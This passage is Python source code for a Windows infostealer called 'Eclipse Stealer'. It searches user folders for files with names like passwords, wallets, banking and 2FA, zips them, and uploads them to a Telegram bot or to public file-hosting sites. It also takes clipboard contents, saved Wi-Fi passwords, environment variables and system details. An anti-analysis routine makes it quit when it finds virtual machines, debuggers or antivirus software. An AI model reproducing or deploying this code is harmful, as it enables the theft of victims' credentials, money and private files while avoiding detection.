    def generate_random_name(self, length: int) -> str:
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for _ in range(length))

    async def zip_and_delete_folder(self, source_folder: str) -> str:
        destination_folder = os.path.join(os.path.dirname(source_folder), f"{self.generate_random_name(10)}_Keywords.zip")
        try:
            with zipfile.ZipFile(destination_folder, 'w', zipfile.ZIP_DEFLATED) as archive:
                for root, _, files in os.walk(source_folder):
                    for file in files:
                        archive.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), source_folder))
            shutil.rmtree(source_folder)
            return destination_folder
        except Exception:
            pass
            return ""

    async def send_to_telegram(self, zip_path: str):
        async with aiohttp.ClientSession() as session:
            if os.path.getsize(zip_path) <= 20 * 1024 * 1024:
                with open(zip_path, 'rb') as f:
                    data = {'chat_id': CHAT_ID}
                    form_data = aiohttp.FormData()
                    form_data.add_field('document', f, filename=os.path.basename(zip_path))
                    form_data.add_field('chat_id', CHAT_ID)
                    async with session.post(self.send_document_url, data=form_data) as response:
                        if response.status != 200:
                            pass
            else:
                file_url = await UploadFiles.upload_file(zip_path)
                message_text = (f"<b>📥  <i><u>{platform.node().upper()} - Eclipse Stealer</u></i></b>\n\n<b>⛓️  Sensitive Files Link: [Stealed Files]({file_url})</b>")
                data = {'chat_id': CHAT_ID, 'text': message_text, 'parse_mode': 'HTML'}
                async with session.post(self.send_message_url, data=data) as response:
                    if response.status != 200:
                        pass

    async def check_sensitive_files(self):
        search_extensions = [".txt", ".jpg", ".png", ".jpeg", ".sql", ".json", ".csv", ".doc", ".docm", ".docx", ".docx", ".point", ".dotm", ".dotx", ".odt", ".pdf", ".xml", ".Xps",]
        search_keywords = ["backup", "code", "discord", "token", "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "account", "acount", "paypal", "banque", "bank", "metamask", "wallet", "crypto", "exodus", "2fa", "a2f", "memo", "compte", "finance", "seecret", "credit", "cni",]
        search_directories = [os.path.join(os.getenv("USERPROFILE"), folder) for folder in ["Desktop", "Downloads", "Documents", "Pictures"]]
        
        random_folder_name = self.generate_random_name(20)
        destination_folder = os.path.join(os.getenv('TEMP'), random_folder_name)
        
        os.makedirs(destination_folder, exist_ok=True)
        for directory in search_directories:
            found_files = await self.search_files(directory, search_keywords, search_extensions)
            for file in found_files:
                file_name = os.path.basename(file)
                destination_path = os.path.join(destination_folder, self.generate_random_name(3) + "_" + file_name)
                shutil.copy2(file, destination_path)

        zip_path = await self.zip_and_delete_folder(destination_folder)
        await self.send_to_telegram(zip_path)

class UploadFiles:
    @staticmethod
    async def getserver() -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.gofile.io/getServer") as request:
                    data = await request.json()
                    return data["data"]["server"]
        except Exception as Error:
            logs_handler(f"[ERROR] - connecting to gofile server: {str(Error)}")
            return "store1"

    @staticmethod
    async def upload_gofile(path: str) -> str:
        try:
            server = await UploadFiles.getserver()
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
                        data = await response.json()
                        if response.status == 200 and "data" in data:
                            return data["data"]["downloadPage"]
                        else:
                            return None
        except Exception as Error:
            logs_handler(f"[ERROR] - uploading to gofile: {str(Error)}")
            return None

    @staticmethod
    async def upload_catbox(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('fileToUpload', file, filename=os.path.basename(path))
                    form.add_field('reqtype', 'fileupload')
                    form.add_field('userhash', '')
                    async with session.post('https://catbox.moe/user/api.php', data=form) as response:
                        result = await response.text()
                        if "catbox.moe" in result:
                            return result
                        else:
                            return None
        except Exception as Error:
            logs_handler(f"[ERROR] - uploading to catbox: {str(Error)}")
            return None

    @staticmethod
    async def upload_fileio(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://file.io/', data=form) as response:
                        if response.status == 200:
                            data = await response.json()
                            return data.get("link")
                        else:
                            return None
        except Exception as Error:
            logs_handler(f"[ERROR] - uploading to fileio: {str(Error)}")
            return None

    @staticmethod
    async def upload_uguu(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://uguu.se/api.php?d=upload', data=form) as response:
                        data = await response.json()
                        if "url" in data:
                            return data.get("url")
                        else:
                            return None
        except Exception as Error:
            logs_handler(f"[ERROR] - uploading to uguu: {str(Error)}")
            return None

    @staticmethod
    async def upload_krakenfiles(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://krakenfiles.com/api/v1/file/upload', data=form) as response:
                        data = await response.json()
                        if "data" in data and "file" in data["data"]:
                            return data["data"]["file"]["url"]
                        else:
                            return None
        except Exception as Error:
            logs_handler(f"[ERROR] - uploading to kraken: {str(Error)}")
            return None

    @staticmethod
    async def upload_file(file_path: str) -> str:
        upload_attempts = [
            ('GoFile', UploadFiles.upload_gofile),
            ('Catbox', UploadFiles.upload_catbox),
            ('File.io', UploadFiles.upload_fileio),
            ('Uguu', UploadFiles.upload_uguu),
            ('KrakenFiles', UploadFiles.upload_krakenfiles),
        ]
        
        for platform, upload_method in upload_attempts:
            try:
                result = await upload_method(file_path)
                if result:
                    return result
            except Exception as Error:
                logs_handler(f"[ERROR] - uploading to {platform.capitalize()}: {str(Error)}")
                continue
        
        return "All upload attempts failed."

class InfoStealer:
    def __init__(self):
        self.loop = asyncio.get_event_loop()

    async def run_all_fonctions(self):
        await asyncio.gather(
            self.StealLastClipBoard(),
            self.StealNetworkInformation(),
            self.StealSystemInfo(),
            self.StealFileSystemInfo(),
            self.StealAntiViruses(),
            self.StealApplicationsInfo(),
            self.StealWifiInfo(),
        )
    
    async def get_command_output(self, command: str) -> str:
        process = await asyncio.create_subprocess_shell(command,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
        stdout, stderr = await process.communicate()
        if stderr:
            logs_handler(f"[ERROR] - running commands")
        return stdout.decode(errors="ignore")

    async def StealLastClipBoard(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-Clipboard")
            if output:
                ListFonction.ClipBoard.append(f"{output}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting clipboard informations: {str(Error)}")

    async def StealNetworkInformation(self) -> None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json") as response:
                    data = await response.json()
                    ip = data["query"]
                    country = data["country"]
                    city = data["city"]
                    timezone = data["timezone"]
                    isp_info = data["isp"] + f" {data['org']} {data['as']}"
                    ListFonction.Network.append(f"IP: {ip}\nCountry: {country}\nCity: {city}\nTimezone: {timezone}\nISP: {isp_info}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting network informations: {str(Error)}")

    async def StealSystemInfo(self) -> None:
        system_info = {}

        def get_os_info():
            try:
                return {
                    "System": platform.system(),
                    "Node Name": platform.node(),
                    "Release": platform.release(),
                    "Version": platform.version(),
                    "Machine": platform.machine(),
                    "Processor": platform.processor()
                }
            except Exception as e:
                return {"OS Info": f"Error retrieving OS info: {str(e)}"}

        def get_cpu_info():
            try:
                return {
                    "Physical Cores": psutil.cpu_count(logical=False),
                    "Total Cores": psutil.cpu_count(logical=True),
                    "Max Frequency": f"{psutil.cpu_freq().max}Mhz",
                    "Min Frequency": f"{psutil.cpu_freq().min}Mhz",
                    "Current Frequency": f"{psutil.cpu_freq().current}Mhz",
                    "CPU Usage": f"{psutil.cpu_percent()}%"
                }
            except Exception as e:
                return {"CPU Info": f"Error retrieving CPU info: {str(e)}"}

        def get_memory_info():
            try:
                virtual_memory = psutil.virtual_memory()
                swap_memory = psutil.swap_memory()
                return {
                    "Total RAM": f"{virtual_memory.total // (1024 ** 2)} MB",
                    "Available RAM": f"{virtual_memory.available // (1024 ** 2)} MB",
                    "Used RAM": f"{virtual_memory.used // (1024 ** 2)} MB",
                    "Total Swap": f"{swap_memory.total // (1024 ** 2)} MB",
                    "Used Swap": f"{swap_memory.used // (1024 ** 2)} MB",
                }
            except Exception as e:
                return {"Memory Info": f"Error retrieving memory info: {str(e)}"}

        def get_disk_info():
            disk_info = {}
            try:
                for partition in psutil.disk_partitions():
                    usage = psutil.disk_usage(partition.mountpoint)
                    disk_info[partition.device] = {
                        "Mountpoint": partition.mountpoint,
                        "Filesystem": partition.fstype,
                        "Total Size": f"{usage.total // (1024 ** 3)} GB",
                        "Used": f"{usage.used // (1024 ** 3)} GB",
                        "Free": f"{usage.free // (1024 ** 3)} GB",
                        "Percentage Used": f"{usage.percent}%"
                    }
                return disk_info
            except Exception as e:
                return {"Disk Info": f"Error retrieving disk info: {str(e)}"}

        def get_environment_variables():
            try:
                return dict(os.environ)
            except Exception as e:
                return {"Environment Variables": f"Error retrieving environment variables: {str(e)}"}

        def get_registry_info():
            registry_data = {}
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
                    registry_data["Product Name"] = winreg.QueryValueEx(key, "ProductName")[0]
                    registry_data["Release ID"] = winreg.QueryValueEx(key, "ReleaseId")[0]
                    registry_data["Build Number"] = winreg.QueryValueEx(key, "CurrentBuild")[0]
                    registry_data["Edition ID"] = winreg.QueryValueEx(key, "EditionID")[0]
                return registry_data
            except Exception as e:
                return {"Registry Info": f"Error retrieving registry info: {str(e)}"}

        try:
            system_info["OS Info"] = get_os_info()
            system_info["CPU Info"] = get_cpu_info()
            system_info["Memory Info"] = get_memory_info()
            system_info["Disk Info"] = get_disk_info()
            system_info["Environment Variables"] = get_environment_variables()
            system_info["Registry Info"] = get_registry_info()

            ListFonction.SystemInfo.append(f"{system_info}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting system information: {str(Error)}")

    async def StealFileSystemInfo(self) -> None:
        filesystem_info = {
            "Directories": {},
            "Disks": []
        }

        directories = {
            "Desktop": os.path.join(os.path.expanduser("~"), "Desktop"),
            "Documents": os.path.join(os.path.expanduser("~"), "Documents"),
            "Downloads": os.path.join(os.path.expanduser("~"), "Downloads"),
            "Pictures": os.path.join(os.path.expanduser("~"), "Pictures"),
            "Videos": os.path.join(os.path.expanduser("~"), "Videos"),
            "Home": os.path.expanduser("~")
        }

        def get_directory_files(dir_path):
            try:
                file_list = []
                folder_list = []
                for root, dirs, files in os.walk(dir_path):
                    for folder in dirs:
                        folder_list.append(os.path.join(root, folder))
                    for file in files:
                        file_list.append(os.path.join(root, file))
                return {"Folders": folder_list, "Files": file_list}
            except Exception as e:
                return {"Error": f"Failed to scan directory {dir_path}: {str(e)}"}

        def get_disk_letters():
            disk_letters = []
            for letter in string.ascii_uppercase:
                if os.path.exists(f"{letter}:\\"):
                    disk_letters.append(f"{letter}:\\")
            return disk_letters

        try:
            for name, path in directories.items():
                filesystem_info["Directories"][name] = get_directory_files(path)
            
            filesystem_info["Disks"] = get_disk_letters()

            ListFonction.FileSystemInfo.append(f"{filesystem_info}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting filesystem information: {str(Error)}")

    async def StealAntiViruses(self) -> None:
        antivirus_names = []

        paths = [
            r"SOFTWARE\Microsoft\Security Center\Provider",
            r"SOFTWARE\Microsoft\Windows Defender"
        ]
        
        def get_antivirus_names_from_registry():
            for path in paths:
                try:
                    registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    for i in range(winreg.QueryInfoKey(registry_key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(registry_key, i)
                            subkey = winreg.OpenKey(registry_key, subkey_name)
                            try:
                                name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                                antivirus_names.append(name)
                            except FileNotFoundError:
                                continue
                        except Exception:
                            continue
                except Exception as e:
                    continue
            return antivirus_names
        try:
            found_antiviruses = get_antivirus_names_from_registry()
            if found_antiviruses:
                for name in found_antiviruses:
                    ListFonction.AntiViruses.append(f"{name}")
        except Exception as e:
            logs_handler(f"Error retrieving antivirus information: {e}")

    async def StealApplicationsInfo(self) -> None:
        applications_info = {
            "Installed Applications": [],
            "Deleted Applications": []
        }

        installed_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]

        def get_application_names_from_registry(paths):
            application_names = []
            for path in paths:
                try:
                    registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    for i in range(winreg.QueryInfoKey(registry_key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(registry_key, i)
                            subkey = winreg.OpenKey(registry_key, subkey_name)
                            
                            try:
                                app_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                                application_names.append(app_name)
                            except FileNotFoundError:
                                continue
                        except Exception:
                            continue
                except Exception:
                    continue
            return application_names

        try:
            applications_info["Installed Applications"] = get_application_names_from_registry(installed_paths)

            ListFonction.ApplicationsInfo.append(f"{applications_info}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting applications information: {str(Error)}")

    async def StealWifiInfo(self) -> None:
        wifi_info = []

        def get_wifi_profiles():
            try:
                profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
                profiles = re.findall(r"All User Profile\s*: (.+)", profiles_output)
                return profiles
            except Exception as e:
                logs_handler(f"Error retrieving Wi-Fi profiles: {str(e)}")
                return []

        def get_wifi_password(profile):
            try:
                password_output = subprocess.check_output(f"netsh wlan show profile \"{profile}\" key=clear", shell=True, text=True)
                password = re.search(r"Key Content\s*: (.+)", password_output)
                return password.group(1) if password else "No password found"
            except Exception as e:
                logs_handler(f"Error retrieving password for {profile}: {str(e)}")
                return "Error retrieving password"

        profiles = get_wifi_profiles()
        for profile in profiles:
            wifi_info.append({
                "SSID": profile,
                "Password": get_wifi_password(profile)
            })

        ListFonction.WifiInfo.extend(f"{wifi_info}")

class AntiVM:
    async def run_all_functions(self) -> None:
        tasks = [
            asyncio.create_task(self.check_disk_space()),
            asyncio.create_task(self.check_recent_files()),
            asyncio.create_task(self.check_process_count()),
            asyncio.create_task(self.check_virtual_memory()),
            asyncio.create_task(self.check_for_virtualization()),
            asyncio.create_task(self.check_for_suspicious_files()),
            asyncio.create_task(self.check_system_manufacturer()),
            asyncio.create_task(self.check_antivirus_processes())
        ]
        try:
            await asyncio.gather(*tasks)
        except Exception as Error:
            logs_handler(f"[ERROR] - run all anti_vm functions: {str(Error)}")

    async def check_disk_space(self) -> None:
        try:
            total_disk_space_gb = sum(psutil.disk_usage(drive.mountpoint).total for drive in psutil.disk_partitions()) / (1024 ** 3)
            if total_disk_space_gb < 100:
                ctypes.windll.kernel32.ExitProcess(0)
            free_space_gb = win32api.GetDiskFreeSpaceEx()[1] / 1073741824
            if free_space_gb < 20:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - suspicious disk space detected: {str(Error)}")

    async def check_recent_files(self) -> None:
        try:
            recent_files_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
            if len(os.listdir(recent_files_folder)) < 20:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - recent files detected: {str(Error)}")

    async def check_process_count(self) -> None:
        try:
            if len(psutil.pids()) < 75:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - suspicious process count detected: {str(Error)}")

    async def check_virtual_memory(self) -> None:
        try:
            total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
            if total_memory_gb < 8:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - suspicious virtual memory detected: {str(Error)}")

    async def check_for_virtualization(self) -> None:
        try:
            process = await asyncio.create_subprocess_shell('wmic path win32_VideoController get name', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await process.communicate()
            video_controller_info = stdout.decode(errors='ignore').splitlines()
            if any(keyword in video_controller_info[2].lower() for keyword in ["virtualbox", "vmware", "qemu", "xen"]):
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - virtual machine detected: {str(Error)}")

    async def check_for_suspicious_files(self) -> None:
        try:
            vm_files = [
                os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'VMDetectionFile.dll'),
                os.path.join(os.getenv('PROGRAMFILES'), 'VMware', 'VMware Tools'),
                os.path.join(os.getenv('SYSTEMROOT'), 'System32', 'drivers', 'vmmouse.sys'),
                os.path.join(os.getenv('SYSTEMROOT'), 'System32', 'drivers', 'vmhgfs.sys')
            ]
            for file_path in vm_files:
                if os.path.exists(file_path):
                    ctypes.windll.kernel32.ExitProcess(0)


            suspicious_process_names = ["32dbg", "64dbgx", "autoruns", "autoruns64", "autorunsc", "autorunsc64", "ciscodump", "df5serv", "die", "dumpcap", "efsdump", "etwdump", "fakenet", "fiddler", "filemon", "hookexplorer", "httpdebugger", "httpdebuggerui", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idau", "idau64", "idaw", "immunitydebugger", "importrec", "joeboxcontrol", "joeboxserver", "ksdumperclient", "lordpe", "ollydbg", "pestudio", "petools", "portmon", "prl_cc", "prl_tools", "proc_analyzer", "processhacker", "procexp", "procexp64", "procmon", "procmon64", "qemu-ga", "qga", "regmon", "reshacker", "resourcehacker", "sandman", "sbiesvc", "scylla", "scylla_x64", "scylla_x86", "sniff_hit", "sysanalyzer", "sysinspector", "sysmon", "tcpdump", "tcpview", "tcpview64", "udpdump", "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", "vm3dservice", "vmacthlp", "vmsrvc", "vmtoolsd", "vmusrvc", "vmwaretray", "vmwareuser", "vt-windows-event-stream", "windbg", "wireshark", "x32dbg", "x64dbg", "x96dbg", "xenservice"]
          
            for proc in psutil.process_iter(attrs=['name']):
                if proc.info['name'].lower() in suspicious_process_names:
                    ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - suspicious files or processes detected: {str(Error)}")

    async def check_system_manufacturer(self) -> None:
        try:
            manufacturer_check_cmds = [
                'wmic computersystem get Manufacturer',
                'wmic baseboard get Manufacturer'
            ]
            for cmd in manufacturer_check_cmds:
                process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                stdout, stderr = await process.communicate()
                if any(keyword in stdout.decode().lower() for keyword in ["vmware", "virtualbox", "qemu", "xen"]):
                    ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - virtual machine manufacturer detected: {str(Error)}")

    async def check_antivirus_processes(self) -> None:
        try:
            antivirus_names = [
                "avast", "avg", "avira", "bitdefender", "kaspersky", "mcafee", 
                "norton", "sophos", "trend micro", "windows defender", "eset", 
                "malwarebytes", "comodo", "f-secure", "360 total security"
            ]
            for proc in psutil.process_iter(attrs=['name']):
                if any(av_name in proc.info['name'].lower() for av_name in antivirus_names):
                    ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - antivirus software detected: {str(Error)}")
        
if __name__ == '__main__':
    if os.name == "nt":
        anti = AntiVM()
        asyncio.run(anti.run_all_functions())

        main = get_data()
        asyncio.run(main.RunAllFonctions())

        files = StealFiles()
        asyncio.run(files.check_sensitive_files())
    else:
        print("run only on windows operating system")
